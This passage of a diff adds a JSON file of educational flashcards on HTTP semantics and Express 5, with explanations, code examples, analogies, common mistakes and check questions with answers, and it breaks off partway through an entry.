@@ -1,0 +1,1273 @@
+[
+  {
+    "key": "app-http-idempotent-retry",
+    "deck": 7001,
+    "title": "Know which methods are safe to retry",
+    "aliases": [],
+    "question": "Which HTTP methods are idempotent, and why does that decide whether a client may automatically retry a request that timed out?",
+    "plain": "GET, HEAD, OPTIONS, PUT and DELETE are idempotent: sending the same request twice leaves the server in the same state as sending it once. POST and PATCH are not guaranteed to be. After a timeout the client cannot tell whether the first attempt reached the server, so an automatic retry is only safe when a repeat can do no extra harm: `PUT /tasks/7` with the same body sets the same values again, while a repeated `POST /tasks` can create a second task.",
+    "example": "```js\n// base = a local node:http server; counter 1 starts at 0\nawait fetch(`${base}/counters/1`, { method: 'PUT', body: '5' });\nawait fetch(`${base}/counters/1`, { method: 'PUT', body: '5' });\nconsole.log(await (await fetch(`${base}/counters/1`)).text()); // 5\nawait fetch(`${base}/counters/1/increment`, { method: 'POST' });\nawait fetch(`${base}/counters/1/increment`, { method: 'POST' });\nconsole.log(await (await fetch(`${base}/counters/1`)).text()); // 7\n```\nRepeating the PUT changes nothing; repeating the POST adds again. A retry helper that repeats every failed call would silently double the increment.",
+    "analogy": "PUT is like typing 21 into a thermostat: press Set twice and it is still 21. A POST increment is like pressing the +1 button: two presses give +2. When you cannot tell whether the first press registered, only the \"set to 21\" button is safe to press again.",
+    "mistake": "Thinking idempotent means \"returns the same response\". The first `DELETE /tasks/7` returns 204 and a repeat returns 404, yet DELETE is still idempotent because the task is gone either way. The promise is also only as good as your handler: a PUT handler that appends to a history table or bumps a counter breaks it.",
+    "check": "A request `PATCH /carts/9` with body `{\"op\":\"add\",\"sku\":\"A1\",\"qty\":1}` times out. Should the client retry it automatically, and why?",
+    "answer": "**No, not blindly.** This PATCH adds one item every time it runs, so if the first attempt reached the server, a retry puts two in the cart. Instead, reload the cart and let the user decide, send an idempotency key the server remembers, or change the contract to a PUT-style `{\"sku\":\"A1\",\"qty\":1}` that sets the quantity."
+  },
+  {
+    "key": "app-http-created-location",
+    "deck": 7001,
+    "title": "Return 201 Created with a Location header",
+    "aliases": [],
+    "question": "A `POST /tasks` handler has saved a new task. What status, header and body should the response usually have, and what does each give the client?",
+    "plain": "Return **201 Created**, a **Location** header with the new task's URL (`/tasks/42`), and usually the created task as JSON. 201 says \"something new now exists\", which 200 does not; Location tells the client where to GET, PUT or DELETE it; the body carries server-assigned fields such as `id` and `createdAt` without a second request. A bare 200 with no id forces the client to reload the whole list to find its new row.",
+    "example": "```js\n// inside a node:http request handler for POST /tasks\nconst task = { id: nextId++, title: data.title, done: false };\ntasks.set(task.id, task);\nres.writeHead(201, {\n  'Content-Type': 'application/json',\n  Location: `/tasks/${task.id}`,\n});\nres.end(JSON.stringify(task));\n// client: r.status, r.headers.get('location') -> 201 /tasks/1\n```\nThe client reads the header with `headers.get('location')`. For a cross-origin API, the server must also list it in `Access-Control-Expose-Headers`, because Location is not one of the response headers CORS exposes by default.",
+    "analogy": "A coat check: 201 is the attendant saying \"taken\", Location is the numbered ticket you use to get the coat back, and the body is the receipt describing what you handed over.",
+    "mistake": "Expecting fetch to follow Location after a 201. Browsers and fetch follow Location automatically only on 3xx redirects; on a 201 it is information for your code. Read it yourself, or read the id from the returned body.",
+    "check": "After `POST /notes` returns 201 with `Location: /notes/42` and an empty body, does fetch automatically request /notes/42, and how does the client get the new note's id?",
+    "answer": "**No — fetch follows Location only for 3xx redirects.** The promise resolves with the 201 response itself (`res.redirected` is false). Read `res.headers.get('location')`, which gives `/notes/42`, and take the id from it — or have the API return the created note in the body so the id and server-set fields arrive in the same response."
+  },
+  {
+    "key": "app-http-409-vs-422",
+    "deck": 7001,
+    "title": "Choose 409 Conflict or 422 for a rejected write",
+    "aliases": [],
+    "question": "A create-user request is rejected. When is 422 Unprocessable Content the better status, and when is 409 Conflict?",
+    "plain": "Use **422** when the request is invalid whatever is stored: the JSON parses, but `email` is blank or `age` is -3. Sending the same body again will always fail. Use **409** when the request is fine on its own but clashes with the current state of the resource, such as an email that is already registered. It could succeed after that state changes. Use 400 when the body cannot be parsed at all. Many APIs use 400 for validation too; pick one convention and document it.",
+    "example": "```js\n// inside POST /users on a node:http server\nlet data;\ntry { data = JSON.parse(body); } catch { return send(res, 400, { error: 'Invalid JSON' }); }\nif (!data.email?.trim()) return send(res, 422, { errors: { email: 'Required' } });\nif (users.has(data.email)) return send(res, 409, { error: 'Email already registered' });\nusers.set(data.email, data);\nreturn send(res, 201, data);\n// {\"email\": }          -> 400\n// {\"email\":\"\"}         -> 422\n// {\"email\":\"a@x.io\"}   -> 201, then the same body again -> 409\n```\nOnly the 409 case depends on what is already stored.",
+    "analogy": "422 is a form handed back because the date-of-birth box says \"banana\": fix the form. 409 is a correctly filled booking for a room someone else took a minute ago: the form is fine, the world changed.",
+    "mistake": "Letting a unique-constraint violation become a 500. The insert fails in a predictable way when the email already exists, so catch that specific database error (in PostgreSQL, SQLSTATE `23505` unique_violation) and return 409 with a message the form can show, instead of reporting a server crash.",
+    "check": "Which status — 400, 409 or 422 — fits each `PUT /projects/5` body: (a) `{\"name\": }` (b) `{\"dueDate\":\"2026-02-30\"}` (c) a name another project already uses, when names must be unique?",
+    "answer": "**(a) 400, (b) 422, (c) 409.** (a) is not valid JSON, so the server cannot even parse it. (b) parses, but 30 February does not exist, so it is invalid whatever is stored. (c) is a valid request that would succeed if the other project did not exist: it conflicts with the current state."
+  },
+  {
+    "key": "app-http-content-type-415",
+    "deck": 7001,
+    "title": "Send the Content-Type your body really has",
+    "aliases": [],
+    "question": "Why does `fetch('/tasks', { method: 'POST', body: JSON.stringify(task) })` with no headers option often reach the server with an empty or rejected body?",
+    "plain": "With a string body and no Content-Type, fetch sends `Content-Type: text/plain;charset=UTF-8`. Servers choose a body parser by that header: Express 5's `express.json()` only parses JSON types, so `req.body` stays `undefined`, and a strict API answers **415 Unsupported Media Type**. Add `headers: { 'Content-Type': 'application/json' }`. Content-Type describes the body you send; `Accept` asks for the format you want back.",
+    "example": "```js\n// /echo-ct on a node:http server replies with the Content-Type it received\nconst post = (body, headers) => fetch(`${base}/echo-ct`, { method: 'POST', body, headers }).then(r => r.text());\nconsole.log(await post(JSON.stringify({ title: 'A' })));\n// text/plain;charset=UTF-8\nconsole.log(await post(JSON.stringify({ title: 'A' }), { 'Content-Type': 'application/json' }));\n// application/json\nconsole.log(await post(new URLSearchParams({ title: 'A' })));\n// application/x-www-form-urlencoded;charset=UTF-8\n```\nfetch picks a default type from the body object. A JSON string is just a string to it.",
+    "analogy": "A shipping label: the warehouse routes parcels by the label without opening them. Glassware labelled \"books\" goes to the wrong shelf even though the contents are fine.",
+    "mistake": "Checking the header with `===`. Real clients send parameters, such as `application/json; charset=utf-8`, so an exact comparison rejects valid JSON with 415. Compare only the part before `;`, lowercased, or use your framework's type check (`express.json()` already does this).",
+    "check": "Your API returns 415 for `curl -X POST localhost:3000/tasks -d '{\"title\":\"A\"}'`, but the browser app works. What Content-Type is curl sending, and how do you fix the command?",
+    "answer": "**`application/x-www-form-urlencoded`.** curl labels `-d` data as form data unless told otherwise, so the JSON-only endpoint rightly refuses it. Add `-H 'Content-Type: application/json'`, or use `--json '{\"title\":\"A\"}'` (curl 7.82 or later), which sets Content-Type and Accept to `application/json` and sends a POST."
+  },
+  {
+    "key": "app-http-cache-control",
+    "deck": 7001,
+    "title": "Read Cache-Control: max-age, no-cache, no-store",
+    "aliases": [],
+    "question": "What is the difference between `Cache-Control: max-age=60`, `no-cache` and `no-store` on an HTTP response?",
+    "plain": "`max-age=60`: a cache may reuse the stored response for 60 seconds without contacting the server. `no-cache`: it may store the response but must revalidate with the server before every reuse, usually getting a small 304 if nothing changed — the name is misleading. `no-store`: do not keep a copy at all. Add `private` to per-user responses so shared caches such as CDNs never store them.",
+    "example": "```js\n// node:http: one policy per kind of response\nif (url.pathname === '/assets/app.3f9a1c.js') {\n  // the file name changes on every build, so it can be kept for a year\n  res.setHeader('Cache-Control', 'public, max-age=31536000, immutable');\n} else if (url.pathname === '/api/tasks') {\n  res.setHeader('Cache-Control', 'private, no-cache'); // keep, but check first\n  res.setHeader('ETag', etagFor(tasks));\n} else if (url.pathname === '/api/me/payment-methods') {\n  res.setHeader('Cache-Control', 'no-store'); // never keep a copy\n}\n```\n`curl -i` shows the header each route really sends.",
+    "analogy": "`max-age=60` is milk with a use-by date: drink it without asking until then. `no-cache` is leftovers you may keep but must check before eating. `no-store` means it never goes in the fridge.",
+    "mistake": "Using `no-cache` to mean \"never cache\". It still allows storing, so for bank details or tokens use `no-store`. The opposite slip: a long `max-age` on `/api/tasks` hides edits until the time runs out, because the browser does not ask the server again while the copy is fresh.",
+    "check": "A hashed bundle `app.3f9a1c.js` and `index.html` both get `Cache-Control: max-age=31536000`. After a deploy, users still run the old app. Which Cache-Control should `index.html` get instead?",
+    "answer": "**`Cache-Control: no-cache`, with an ETag or Last-Modified.** `index.html` must be checked on every load so it can point at the new hashed file names; when nothing changed, the check costs a small 304. Hashed files can keep the year-long `max-age` (plus `immutable`) because each build gives changed files new names."
+  },
+  {
+    "key": "app-http-etag-304",
+    "deck": 7001,
+    "title": "Revalidate with ETag and 304 Not Modified",
+    "aliases": [],
+    "question": "How do `ETag`, `If-None-Match` and `304 Not Modified` let a client reuse a cached GET response without downloading the body again?",
+    "plain": "The server labels each version of a response: `ETag: \"5258dddf\"`. To check a stored copy, the client repeats the GET with `If-None-Match: \"5258dddf\"`. If the resource still has that tag, the server replies **304 Not Modified** with headers and no body, and the client reuses its copy; otherwise it sends 200 with the new body and a new ETag. Browsers do this automatically for their HTTP cache — the server's job is to compute the tag and compare it.",
+    "example": "```bash\n$ curl -i localhost:3000/tasks/1\nHTTP/1.1 200 OK\nContent-Type: application/json\nETag: \"5258dddf\"\nCache-Control: private, no-cache\n\n{\"id\":1,\"title\":\"A\",\"done\":false}\n$ curl -i localhost:3000/tasks/1 -H 'If-None-Match: \"5258dddf\"'\nHTTP/1.1 304 Not Modified\nETag: \"5258dddf\"\nCache-Control: private, no-cache\n```\nOutput trimmed to the relevant headers. The tag here is the first 8 hex characters of a SHA-1 of the task JSON; any value that changes whenever the content changes will do.",
+    "analogy": "Asking a librarian \"has timetable version 7 changed?\" A \"no\" costs one word; only a \"yes\" needs a fresh printout.",
+    "mistake": "Comparing the header to the tag with `===`. `If-None-Match` can hold several tags (`\"a\", \"b\"`), `*`, or weak tags like `W/\"a\"`, which compression layers often produce, and it matches weakly. Also remember that if the handler does all its database work before comparing, a 304 saves bandwidth but not server time.",
+    "check": "Predict: a GET returned `ETag: \"v3\"`. The task is then edited, and its ETag becomes `\"v4\"`. The client sends `If-None-Match: \"v3\"`. What status, headers and body come back?",
+    "answer": "**200 OK with the full new body and `ETag: \"v4\"`.** The client's tag no longer matches, so its copy is stale; the server sends the fresh representation and the new tag, which the client stores for next time. A 304 comes back only when the current tag matches one listed in If-None-Match."
+  },
+  {
+    "key": "app-http-cors-preflight",
+    "deck": 7001,
+    "title": "Know when the browser sends a CORS preflight",
+    "aliases": [],
+    "question": "Why does a page on localhost:5173 send an OPTIONS request before its `fetch` that POSTs JSON with `Content-Type: application/json` to an API on localhost:3000?",
+    "plain": "Different ports make it cross-origin, and it is not a \"simple\" request: `application/json` is not one of the three types an HTML form can send (`text/plain`, `multipart/form-data`, `application/x-www-form-urlencoded`). So the browser first asks with a preflight `OPTIONS` carrying `Origin`, `Access-Control-Request-Method: POST` and `Access-Control-Request-Headers: content-type`. Only if the response allows them does it send the real POST. PUT, PATCH, DELETE and an `Authorization` header trigger a preflight too.",
+    "example": "```bash\n$ curl -i -X OPTIONS localhost:3000/tasks \\\n    -H 'Origin: http://localhost:5173' \\\n    -H 'Access-Control-Request-Method: POST' \\\n    -H 'Access-Control-Request-Headers: content-type'\nHTTP/1.1 204 No Content\nAccess-Control-Allow-Origin: http://localhost:5173\nAccess-Control-Allow-Methods: GET, POST, PUT, PATCH, DELETE\nAccess-Control-Allow-Headers: Content-Type, Authorization\nAccess-Control-Max-Age: 600\n```\nOutput trimmed. This curl call imitates the browser's preflight, so you can test the server's answer without a browser. `Max-Age` lets the browser reuse the permission for 10 minutes.",
+    "analogy": "Phoning a restaurant to ask \"can we bring six people and a dog?\" before driving over. An ordinary walk-in visit, like a simple GET, does not phone ahead.",
+    "mistake": "Running authentication before the OPTIONS handler. A preflight never carries cookies or an Authorization header, so a 401 on OPTIONS makes every request that needs a preflight fail with a CORS error in the console. Answer OPTIONS before auth, and keep treating CORS as a browser read permission, not as access control.",
+    "check": "Which of these cross-origin fetches trigger a preflight: (a) plain GET, (b) `DELETE /tasks/3`, (c) GET with an `Authorization: Bearer` header, (d) POST with a `FormData` body?",
+    "answer": "**(b) and (c).** DELETE is not GET, HEAD or POST, and Authorization is not a CORS-safelisted header, so both need permission first. (a) is a simple request. (d) is a POST whose FormData body is sent as `multipart/form-data`, a form-compatible type, so it goes straight out; the response still needs `Access-Control-Allow-Origin` for the page to read it."
+  },
+  {
+    "key": "app-http-redirect-method",
+    "deck": 7001,
+    "title": "Pick 303, 307 or 308 for a redirect",
+    "aliases": [],
+    "question": "A POST request gets a redirect response. With 301, 302 or 303 versus 307 or 308, what method and body does the browser's follow-up request use?",
+    "plain": "**303 See Other** makes the follow-up a GET with no body — what you want after a form save. **307** (temporary) and **308** (permanent) require the client to repeat the same method and body at the new URL, which suits a moved API endpoint. **301** and **302** are older: browsers and fetch turn a redirected POST into a GET and drop the body, which quietly breaks POST endpoints. 301 and 308 are permanent and may be cached; 302, 303 and 307 are temporary.",
+    "example": "```js\n// /old?code=N answers N with Location: /echo; /echo reports what it received\nfor (const code of [301, 302, 303, 307, 308]) {\n  const r = await fetch(`${base}/old?code=${code}`, { method: 'POST', body: 'title=A' });\n  console.log(code, await r.text());\n}\n// 301 GET ct=- body=\"\"\n// 302 GET ct=- body=\"\"\n// 303 GET ct=- body=\"\"\n// 307 POST ct=text/plain;charset=UTF-8 body=\"title=A\"\n// 308 POST ct=text/plain;charset=UTF-8 body=\"title=A\"\n```\nRun with Node 22's built-in fetch, which follows the same redirect rules as browsers.",
+    "analogy": "303 is a receptionist saying \"got your form — now go and read the noticeboard over there\": you walk over empty-handed. 307 and 308 say \"wrong desk, take the same form to desk 4\".",
+    "mistake": "Redirecting a renamed API route, say `/api/task` to `/api/tasks`, with 301. GET clients keep working, but POSTs arrive as GETs without a body and hit the list endpoint or a 405. Use 308 for a permanent move that must keep the method.",
+    "check": "After a successful `POST /orders` from an HTML form, the server redirects to `/orders/81`. Which status should it use, and what would go wrong with 307?",
+    "answer": "**303 See Other.** The browser then GETs /orders/81, so the page the user sees came from a GET and refreshing it is harmless. With 307 the browser would resend the POST and its form body to /orders/81: at best a 405, at worst a second order if that URL accepts POST."
+  },
+  {
+    "key": "app-http-urlsearchparams",
+    "deck": 7001,
+    "title": "Build and read query strings with URLSearchParams",
+    "aliases": [],
+    "question": "A list endpoint reads `?page=2&tag=a&tag=b` with URLSearchParams. What do `get('page')`, `get('limit')` and `get('tag')` return, and how do you get every tag?",
+    "plain": "Reading gives strings only: `get('page')` returns `'2'`, not 2, and `get('limit')` returns `null` because the parameter is missing. For a repeated key, `get('tag')` returns the first value, `'a'`, and `getAll('tag')` returns `['a', 'b']`. Convert and validate numbers yourself. Build query strings with the same API: `url.searchParams.set('q', text)` encodes `&` as `%26` and a space as `+`, so user text cannot start a new parameter.",
+    "example": "```js\nconst url = new URL('/tasks', 'http://localhost:3000');\nurl.searchParams.set('status', 'open');\nurl.searchParams.set('q', 'rock & roll');\nconsole.log(url.href); // http://localhost:3000/tasks?status=open&q=rock+%26+roll\n\nconst p = new URL('http://x/tasks?page=2&tag=a&tag=b').searchParams;\nconsole.log(typeof p.get('page')); // string\nconsole.log(p.get('limit'));        // null\nconsole.log(p.get('tag'), p.getAll('tag')); // a [ 'a', 'b' ]\n```\nPass `url` straight to fetch. On a node:http server, read `new URL(req.url, 'http://localhost').searchParams` the same way.",
+    "analogy": "Filling in a paper form box by box instead of writing everything on one line: the clerk never mistakes the \"&\" in \"rock & roll\" for the start of the next field.",
+    "mistake": "Decoding query values with `decodeURIComponent`. It leaves `+` as a literal plus, so `q=rock+roll` becomes `rock+roll`, while URLSearchParams reads `+` as a space and gives `rock roll`. Read and write query strings with the same tool.",
+    "check": "Predict `limit` for `?limit=abc`, for `?limit=`, and with no limit parameter, when a server reads `const limit = Number(params.get('limit') ?? 20)`.",
+    "answer": "**NaN, 0 and 20.** `Number('abc')` is NaN; an empty value is the string `''`, and `Number('')` is 0; a missing key gives `null`, so `??` falls back to 20. Validate after converting, for example `Number.isInteger(limit) && limit >= 1 && limit <= 100`, and otherwise answer 400 or use the default."
+  },
+  {
+    "key": "app-http-curl-inspect",
+    "deck": 7001,
+    "title": "Inspect raw HTTP with curl -i and -v",
+    "aliases": [],
+    "question": "When you test an API from the terminal, what does `curl -i` show, what does `curl -v` add, and why is plain `curl URL` not enough?",
+    "plain": "Plain `curl URL` prints only the response body, so a 404 error page or an empty 204 hides what happened. `-i` adds the status line and response headers above the body: status, Content-Type, Location, Cache-Control, ETag. `-v` (verbose) also shows the request curl sent, on lines starting with `>`, and the response headers on lines starting with `<`, so you can confirm the method, Content-Type and Authorization that really left your machine.",
+    "example": "```bash\n$ curl -v -X DELETE localhost:3000/tasks/1\n* Connected to localhost (::1) port 3000\n> DELETE /tasks/1 HTTP/1.1\n> Host: localhost:3000\n> User-Agent: curl/8.15.0\n> Accept: */*\n>\n< HTTP/1.1 204 No Content\n< Date: Thu, 24 Sep 2026 22:21:09 GMT\n< Connection: keep-alive\n<\n```\nOutput trimmed. Without `-v` or `-i` this 204 prints nothing at all, and a 404 would print only its body, never the status.",
+    "analogy": "Plain curl shows you the letter. `-i` adds the envelope with its postmarks. `-v` also hands you a copy of the letter you sent.",
+    "mistake": "Trusting curl's exit status in scripts. `curl URL && echo ok` prints ok even for a 404 or 500, because curl only fails on network errors by default. In smoke checks use `--fail` (`-f`), which exits with code 22 for HTTP 400 and above, and `-sS` to hide the progress meter but keep error messages.",
+    "check": "An API call with a bearer token keeps returning 401. How can you use curl to check whether the Authorization header was really sent, and where in the output do you look?",
+    "answer": "**Run the request with `-v` and read the lines starting with `>`.** They are the exact request headers curl sent, such as `> Authorization: Bearer eyJ…`. If the line is missing, or reads `Bearer` with nothing after it because a shell variable was empty, the problem is on the client side; if the token is there, check the token itself, for example whether it has expired."
+  },
+  {
+    "key": "app-express-params-strings",
+    "deck": 7002,
+    "title": "Route params arrive as strings",
+    "aliases": [
+      "req.params",
+      "req.query"
+    ],
+    "question": "An Express route is `/tasks/:id` and the request is GET /tasks/7. What type is `req.params.id`, and why does `tasks.find(t => t.id === req.params.id)` miss the task whose id is the number 7?",
+    "plain": "Everything in a URL is text, so `req.params.id` is the string `\"7\"`. Strict equality (`===`) also compares types, and `7 === \"7\"` is false, so `find` returns `undefined` and the handler answers 404 for a task that exists. Convert once at the edge with `Number(req.params.id)`, then check `Number.isInteger(id)` and reply 400 if it fails. Query values in `req.query` are strings too.",
+    "example": "```js\nconst tasks = [{ id: 7, title: 'Buy milk' }];\n\napp.get('/tasks/:id', (req, res) => {\n  typeof req.params.id;                        // 'string'\n  tasks.find(t => t.id === req.params.id);     // undefined\n  const id = Number(req.params.id);\n  if (!Number.isInteger(id)) {\n    return res.status(400).json({ error: 'id must be a whole number' });\n  }\n  const task = tasks.find(t => t.id === id);   // { id: 7, ... }\n  if (!task) return res.status(404).json({ error: 'Task not found' });\n  res.json(task);\n});\n```\nIn Express 5, GET /tasks/7 hits the string comparison first and finds nothing; the converted `id` finds the task. GET /tasks/abc gets a 400 because `Number('abc')` is `NaN`.",
+    "analogy": "A paper order form has a box labelled \"Quantity\". Even when someone writes 7 in it, the clerk receives handwriting, not a number, and has to read it as a number before doing any arithmetic. A URL is that paper form: the server always receives text and must convert it on purpose.",
+    "mistake": "Switching to loose equality (`==`) or `parseInt` to make the lookup work. `==` hides the type mix-up everywhere else in the code, and `parseInt('7abc', 10)` quietly returns 7, so junk ids get accepted. Use `Number()`, which gives `NaN` for `'7abc'`, and reject it with a 400.",
+    "check": "An Express 5 handler receives GET /tasks?page=2&page=3 and runs `const page = Number(req.query.page)`. What are `req.query.page` and `page`, and how should the handler respond?",
+    "answer": "**`req.query.page` is the array `['2', '3']` and `page` is `NaN`.** A repeated query key becomes an array of strings, and `Number(['2', '3'])` is `NaN`. Check `Number.isInteger(page)` (and a sensible range) and reply 400 with a clear message instead of querying with `NaN`."
+  },
+  {
+    "key": "app-express-json-body",
+    "deck": 7002,
+    "title": "Parse JSON bodies with express.json()",
+    "aliases": [
+      "req.body",
+      "body-parser"
+    ],
+    "question": "In an Express 5 app, why can `req.body` be undefined in a POST handler, and what must the server and the client each do for a JSON body to arrive?",
+    "plain": "Express does not read request bodies on its own. The server must register the built-in parser, `app.use(express.json())`, before its routes; no separate `body-parser` install is needed. The parser only runs when the request says `Content-Type: application/json`, so the client must send that header. If either piece is missing, `req.body` stays `undefined` in Express 5.",
+    "example": "```js\n// server\nconst app = express();\napp.use(express.json()); // before the routes that read req.body\napp.post('/tasks', (req, res) => {\n  res.status(201).json({ title: req.body.title });\n});\n\n// client\nawait fetch('/tasks', {\n  method: 'POST',\n  headers: { 'Content-Type': 'application/json' },\n  body: JSON.stringify({ title: 'Buy milk' }),\n}); // 201 {\"title\":\"Buy milk\"}\n```\nWithout `express.json()`, or without the header, the same request reaches the handler with `req.body === undefined`.",
+    "analogy": "A post room only opens envelopes marked \"Letter\" if someone was hired to open them. `express.json()` is the person you hire, and the `Content-Type` header is the label on the envelope; an unlabelled envelope sits on the desk unopened.",
+    "mistake": "Calling `fetch` with `body: JSON.stringify(data)` but no headers. The browser then labels the body `text/plain;charset=UTF-8`, `express.json()` skips it, and the handler crashes or saves empty data even though the JSON text looks right in the Network panel.",
+    "check": "Predict what happens when a client POSTs the malformed text `{\"title\":` with `Content-Type: application/json` to an Express 5 app that uses `express.json()`. Does the route handler run?",
+    "answer": "**No, the handler never runs.** `express.json()` fails to parse the text and passes an error to `next(err)` with `err.status` 400 and `err.type` `'entity.parse.failed'`. Without a custom error handler, Express replies 400 with an HTML error page; a JSON API should add an error handler that uses `err.status` to send a 400 JSON body."
+  },
+  {
+    "key": "app-express-middleware-order",
+    "deck": 7002,
+    "title": "Middleware runs in registration order",
+    "aliases": [
+      "next()",
+      "app.use"
+    ],
+    "question": "How does Express decide which middleware and routes run for a request, and what must each middleware function do so the request does not hang?",
+    "plain": "Express walks through everything registered with `app.use` and `app.get`/`app.post` from top to bottom and runs each one whose path and method match. Each function must either send a response or call `next()` to pass control on. If it does neither, the request stays pending until the client gives up. Once a response is sent, later functions do not run, so order is a design choice: parsers and logging first, public routes, then auth, then protected routes.",
+    "example": "```js\napp.use((req, res, next) => { console.log(req.method, req.url); next(); });\napp.get('/health', (req, res) => res.send('ok')); // public: before auth\n\napp.use((req, res, next) => {\n  if (!req.get('Authorization')) {\n    return res.status(401).json({ error: 'Sign in' });\n  }\n  next();\n});\napp.get('/tasks', (req, res) => res.json([])); // protected\n```\nGET /health runs the logger, then the health route (200). GET /tasks without a header stops at auth (401); with one it runs logger, auth, then the route (200).",
+    "analogy": "Think of airport checkpoints in a single corridor. Each desk either stamps your pass and waves you on (`next()`), turns you back (sends a response), or, if the officer walks away, leaves you standing there forever. A desk placed after the gate never sees passengers who already boarded.",
+    "mistake": "Registering `app.use(requireUser)` at the top of the file to be safe. Every route below it now needs a login, including `/health` and the sign-in route itself, so health checks fail and nobody can log in. Put public routes above the auth middleware, or attach it to the routers that need it.",
+    "check": "A logging middleware is registered with `app.use` after `app.get('/tasks', …)`. Requests to GET /tasks are never logged, but requests to unknown URLs are. Why?",
+    "answer": "**The route answers first, so the request never reaches the logger.** The `/tasks` handler sends a response and does not call `next()`, which ends the chain. Unknown URLs match no route and fall through to the logger. Register logging middleware before the routes."
+  },
+  {
+    "key": "app-express-async-errors",
+    "deck": 7002,
+    "title": "Express 5 catches rejected async handlers",
+    "aliases": [
+      "async error handling",
+      "unhandled rejection"
+    ],
+    "question": "In Express 5, an async route handler awaits a database call that rejects. What happens to the error, and how did Express 4 behave differently?",
+    "plain": "Express 5 watches the promise an async handler returns. If it rejects, Express calls `next(err)` for you, so the error reaches your error-handling middleware (or the default handler, which replies 500). Express 4 ignored that promise, so the rejection went unhandled: on Node 22 that crashes the whole server. That is why older code wraps every handler in `try/catch` with `next(err)`. The rescue only covers the returned promise, not work you start without `await`.",
+    "example": "```js\napp.get('/tasks/:id', async (req, res) => {\n  const task = await db.findTask(req.params.id); // rejects: 'db down'\n  res.json(task);\n});\n\napp.use((err, req, res, next) => {\n  console.error(err);              // full details in the server log\n  res.status(500).json({ error: 'Something went wrong' });\n});\n// Express 5: GET /tasks/1 -> 500 {\"error\":\"Something went wrong\"}\n```\nIn Express 5 the handler needs no `try/catch`. On Express 4 the same rejection went unhandled, and Node 22 crashed the server process.",
+    "analogy": "Express 5 is like a manager who waits for a promised report and, if the work fails, escalates to the right desk. Express 4 walked away after assigning the work, so a failure never reached the desk that handles problems and brought down the whole office instead.",
+    "mistake": "Keeping `try { … } catch (e) { res.status(500).json(…) }` in every Express 5 handler. It duplicates error formatting in dozens of places and hides errors from the central handler. Catch locally only when you turn a specific error into a specific response, such as a unique-constraint violation into 409.",
+    "check": "An Express 5 handler runs `db.save(task).then(() => res.sendStatus(204))` without `return` or `await`, and `save` rejects. Does the error reach the error handler, and why?",
+    "answer": "**No.** The handler returns `undefined`, so Express has no promise to watch. The rejection is unhandled, and Node 22 by default crashes the whole process (exit code 1), dropping every in-flight request. Write `await db.save(task)` (or `return` the promise) so Express 5 can forward the failure."
+  },
+  {
+    "key": "app-express-error-handler",
+    "deck": 7002,
+    "title": "Write a four-argument error handler",
+    "aliases": [
+      "error middleware",
+      "err, req, res, next"
+    ],
+    "question": "What makes an Express function an error handler rather than ordinary middleware, and where in the app must it be registered?",
+    "plain": "Express treats a function as an error handler only if it declares exactly four parameters: `(err, req, res, next)`. Register it with `app.use` after all routes and other middleware, because errors travel forward through the stack. It receives errors from `next(err)`, thrown errors, and rejected async handlers. Use `err.status` when it exists (body-parser sets 400), otherwise reply 500 with a generic message, and log the details on the server.",
+    "example": "```js\napp.use(express.json());\napp.use('/api/tasks', tasksRouter);\n\napp.use((err, req, res, next) => {\n  if (res.headersSent) return next(err); // let Express close it\n  console.error(err);\n  const status = err.status ?? 500;\n  res.status(status).json({\n    error: status < 500 ? 'Bad request' : 'Something went wrong',\n  });\n});\n```\nA rejected handler gets `500 {\"error\":\"Something went wrong\"}`, and malformed JSON from `express.json()` gets `400 {\"error\":\"Bad request\"}`.",
+    "analogy": "It is the emergency exit at the end of a corridor. Express only recognises the door by its sign (the four parameters), and it only helps people who are still in front of it, so it must be at the end, not the start.",
+    "mistake": "Sending `err.message` or `err.stack` to the client. Messages from a database driver can reveal table names, SQL, or file paths. Return a short generic message for 500s and keep the details in server logs.",
+    "check": "A team registers `app.use((err, req, res) => res.status(500).json({ error: 'Oops' }))` after its routes, but errors still return Express's default HTML error page. What is wrong?",
+    "answer": "**The function has three parameters, so Express treats it as normal middleware.** Express counts declared parameters to spot error handlers. With only `(err, req, res)` it is skipped for errors, and the default handler sends HTML. Declare `(err, req, res, next)` even if `next` is unused."
+  },
+  {
+    "key": "app-express-not-found",
+    "deck": 7002,
+    "title": "Send a JSON 404 for unmatched routes",
+    "aliases": [
+      "catch-all route",
+      "Cannot GET"
+    ],
+    "question": "When no Express 5 route matches a request such as GET /api/taks, what does Express send by default, and how do you return a JSON 404 instead?",
+    "plain": "An unmatched request falls off the end of the stack and Express's default handler replies 404 with a small HTML page saying \"Cannot GET /api/taks\". A JSON client then fails in `response.json()`. Add a catch-all `app.use((req, res) => res.status(404).json({ error: 'Not found' }))` after every route and before the error handler. A route that matched but found no record should still send its own 404.",
+    "example": "```js\napp.use('/api/tasks', tasksRouter);\n\n// after all routes: nothing matched\napp.use((req, res) => {\n  res.status(404).json({ error: `No route for ${req.method} ${req.path}` });\n});\n\n// last: error handler\napp.use((err, req, res, next) => {\n  res.status(500).json({ error: 'Something went wrong' });\n});\n```\nWithout the catch-all, GET /tasks/99 gets 404 `text/html` \"Cannot GET /tasks/99\"; with it, the 404 is JSON that a `fetch` client can parse.",
+    "analogy": "It is the reception desk at the end of a hallway of offices. If no office door matched your request, reception gives you a clear written answer instead of you finding a blank wall with a handwritten note.",
+    "mistake": "Treating \"route not found\" and \"record not found\" as the same case. The catch-all handles URLs your API does not have. GET /api/tasks/99 matches a real route, so that handler must check the database result and send 404 itself.",
+    "check": "A catch-all `app.use((req, res) => res.status(404).json({ error: 'Not found' }))` is placed at the top of an Express app, before the routes. What does GET /api/tasks return, and why?",
+    "answer": "**404 `{\"error\":\"Not found\"}`, for every URL.** `app.use` without a path matches all requests, and this function responds without calling `next()`, so no route below it ever runs. Move the catch-all below all routes, just above the error handler."
+  },
+  {
+    "key": "app-express-router",
+    "deck": 7002,
+    "title": "Group routes with express.Router",
+    "aliases": [
+      "Router",
+      "mergeParams"
+    ],
+    "question": "How does `express.Router()` mounted with `app.use('/api/tasks', tasksRouter)` change the paths you write inside the router file?",
+    "plain": "A router is a small set of routes and middleware you mount at a path. Paths inside it are relative to that mount point: `router.get('/:id')` serves GET /api/tasks/:id, and `router.get('/')` serves GET /api/tasks. Inside, `req.baseUrl` is `/api/tasks`. This keeps one feature in one file, and `router.use(requireUser)` protects only that feature.",
